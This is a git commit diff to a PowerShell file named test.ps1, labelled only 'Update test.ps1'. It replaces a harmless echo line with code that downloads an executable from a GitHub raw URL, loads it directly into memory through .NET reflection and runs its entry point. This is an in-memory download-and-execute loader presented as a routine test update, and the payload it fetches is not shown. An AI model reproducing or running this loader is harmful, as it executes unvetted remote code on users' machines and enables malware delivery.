a5e8f817117fafce39c4fa1e58e2ed9686db2b2a
mohamedali43 <mohamedali43@tutamail.com>
2024-09-04 00:50:00 +0000

    Update test.ps1

--- test.ps1
+++ test.ps1
@@ -1,1 +1,13 @@
-echo "mohamedali43"
+$url = " https://raw.githubusercontent.com/mohamedali43/ps1/main/test.exe"
+
+$webClient = New-Object System.Net.WebClient
+
+$exeBytes = $webClient.DownloadData($url)
+
+$assembly = [System.Reflection.Assembly]::Load($exeBytes)
+
+$entryPoint = $assembly.EntryPoint
+
+if ($entryPoint) {
+    $entryPoint.Invoke($null, @([string[]]@()))
+}
